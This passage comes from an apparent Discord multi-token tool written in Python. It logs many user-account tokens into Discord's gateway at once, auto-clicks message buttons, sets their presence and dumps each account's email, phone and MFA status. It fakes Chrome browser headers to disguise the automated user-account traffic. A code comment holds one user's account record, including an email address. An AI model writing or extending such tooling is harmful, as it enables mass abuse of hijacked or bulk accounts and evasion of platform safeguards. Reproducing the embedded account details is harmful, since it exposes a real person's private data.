            # Make the POST request to Discord's API
            response = requests.post(
                f'https://discord.com/api/v9/interactions',
                json=payload,
                headers=headers
            )

            # Check the response
            if response.status_code == 204:
                print("Button clicked successfully!")
            else:
                print(f"Failed to click button: {response.status_code} - {response.text}")
            raise asyncio.CancelledError  # Raise an error to exit the current task
        else:
            pass  # Handle other message types as needed

    async def heartbeat():
        global heartbeat_interval, websocket
        while True:
            await asyncio.sleep(heartbeat_interval)
            if websocket:
                await websocket.send(json.dumps({'op': 1, 'd': None}))
                print("HeartBeat sent!")

    async def on_open(websocket, usertoken):
        auth = {
            "op": 2,
            "d": {
                "token": usertoken,
                "properties": {
                    "$os": "Windows 10",
                    "$browser": "Google Chrome",
                    "$device": "Windows"
                },
                "presence": {
                    "status": status,
                    "afk": False
                }
            }
        }
        await websocket.send(json.dumps(auth))

    async def run_joiner(usertoken):
        global websocket
        uri = 'wss://gateway.discord.gg/?v=9&encoding=json'
        async with websockets.connect(uri, max_size=None) as ws:
            websocket = ws  # Assign the websocket instance
            await on_open(websocket, usertoken)
            try:
                async for message in websocket:
                    await on_message(message, usertoken)
            except asyncio.CancelledError:
                print(f"Task for token {usertoken} cancelled.")
            finally:
                await websocket.close()

    async def start_bot(usertoken):
        validate = requests.get('https://canary.discordapp.com/api/v9/users/@me', headers={"Authorization": usertoken})
        if validate.status_code != 200:
            print(f"[ERROR] Token {usertoken} might be invalid. Please check it again.")
            return

        userinfo = validate.json()
        username = userinfo["username"]
        discriminator = userinfo["discriminator"]
        userid = userinfo["id"]

        print(f"Logged in as {username}#{discriminator} ({userid}).")
        await run_joiner(usertoken)

    async def run_multiple_instances(tokens):
        tasks = []
        for token in tokens:
            tasks.append(asyncio.create_task(start_bot(token)))
        await asyncio.gather(*tasks)

    asyncio.run(run_multiple_instances(tokens))
    

if choice == '14':
    print("No proxies :p")
    for token in tokens:
        headers = {'Authorization': token}
        reqobj = requests.get('https://discord.com/api/v10/users/@me',headers=headers, verify=False)
        #{"id":"1210127720126881814","username":"nexus0596","avatar":"831597146f55f68d3ed7a1b77395c9b4","discriminator":"0","public_flags":0,"premium_type":2,"flags":0,"banner":null,"accent_color":8442661,"global_name":"AndrexYT/alt","avatar_decoration_data":null,"banner_color":"#80d325","mfa_enabled":true,"locale":"en-US","email":"2b2tnexusstore@gmail.com","verified":true,"phone":null,"nsfw_allowed":true,"premium_usage_flags":0,"linked_users":[],"purchased_flags":2,"bio":"","authenticator_types":[2]}
        if reqobj.status_code == 200:
            data = reqobj.json()
            OAuth_color = Colors.green if data["mfa_enabled"] else Colors.red
            Email_color = Colors.green if data["verified"] else Colors.red
            print(Style(f'Username: {data["username"]}\nDisplay name: {data["global_name"]}\nBio: {data["bio"]}\nEmail: {data["email"]}') + Style('\nOAuth: ') + OAuth_color + str(data["mfa_enabled"]) + Style(f'\nEmail verified: ') + Email_color + str(data["verified"]) + Style(f'\nPhone: {data["phone"]}'))
            print("")

        elif reqobj.status_code == 401:
            print(f"{Colors.red}[✗] " + Colorate.Horizontal(Colors.yellow_to_red, f'{token} is locked!', 1))

        elif reqobj.status_code == 403:
            print(f"{Colors.red}[✗] " + Colorate.Horizontal(Colors.yellow_to_red, f'{token} is locked!', 1))

if choice == '16':
    print("No proxies :p")
    payload = {
      "type": 3,
      "nonce": calculateNonce(),
      "guild_id": guild_id,
      "channel_id": channel_id,
      "message_flags": 0,
      "message_id": message_id,
      "application_id": application_id,
      "session_id": session_id,
      "data": {
        "component_type": 2,
        "custom_id": custom_id
      }
    }

    print(payload)

    # Headers for the POST request
    headers = {
        'accept': '*/*',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,cs;q=0.6',
        'authorization': usertoken,
        'content-type': 'application/json',
        'cookie': f'locale=en-US; discordUserToken={usertoken}',
        'dnt': '1',
        'origin': 'https://discord.com',
        'referer': f'https://discord.com/channels/{guild_id}/{channel_id}/',
        'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-discord-locale': 'en-US',
        'x-discord-timezone': 'Europe/Budapest',
        'x-super-properties': base64.b64encode(b'{"os": "Windows","client_build_number": 310927}')
    }

if choice == '17':
    print("No proxies :p")
    status = input(Style('Status [online/dnd/idle]') + ' >> ')
    if status != 'online' and status != 'dnd' and status != 'idle':
        status = 'online'

    async def on_message(message):
        global heartbeat_interval
        payload = json.loads(message)
        if payload.get('op') == 10:  # OpCode 10 signifies a hello payload
            heartbeat_interval = payload['d']['heartbeat_interval'] / 1000
            heartbeat_task = asyncio.create_task(heartbeat())
            print("HeartBeat sent!")
        elif payload.get('op') == 11:  # OpCode 11 signifies a heartbeat ACK
            pass
        else:
            pass  # Handle other message types as needed

    async def heartbeat():
        global heartbeat_interval, websocket
        while True:
            await asyncio.sleep(heartbeat_interval)
            if websocket:
                await websocket.send(json.dumps({'op': 1, 'd': None}))
                print("HeartBeat sent!")

    async def on_open(websocket, usertoken):
        auth = {
            "op": 2,
            "d": {
                "token": usertoken,
                "properties": {
                    "$os": "Windows 10",
                    "$browser": "Google Chrome",
                    "$device": "Windows"
                },
                "presence": {
                    "status": status,
                    "afk": False
                }
            }
        }
        await websocket.send(json.dumps(auth))

    async def run_joiner(usertoken):
        global websocket
        uri = 'wss://gateway.discord.gg/?v=9&encoding=json'
        async with websockets.connect(uri, max_size=None) as ws:
            websocket = ws  # Assign the websocket instance
            await on_open(websocket, usertoken)
            async for message in websocket:
                await on_message(message)

    async def start_bot(usertoken):
        validate = requests.get('https://canary.discordapp.com/api/v9/users/@me', headers={"Authorization": usertoken})
        if validate.status_code != 200:
            print(f"[ERROR] Token {usertoken} might be invalid. Please check it again.")
            return

        userinfo = validate.json()
        username = userinfo["username"]
        discriminator = userinfo["discriminator"]
        userid = userinfo["id"]

        print(f"Logged in as {username}#{discriminator} ({userid}).")
        await run_joiner(usertoken)

    async def run_multiple_instances(tokens):
        tasks = []
        for token in tokens:
            tasks.append(asyncio.create_task(start_bot(token)))
        await asyncio.gather(*tasks)

    asyncio.run(run_multiple_instances(tokens))
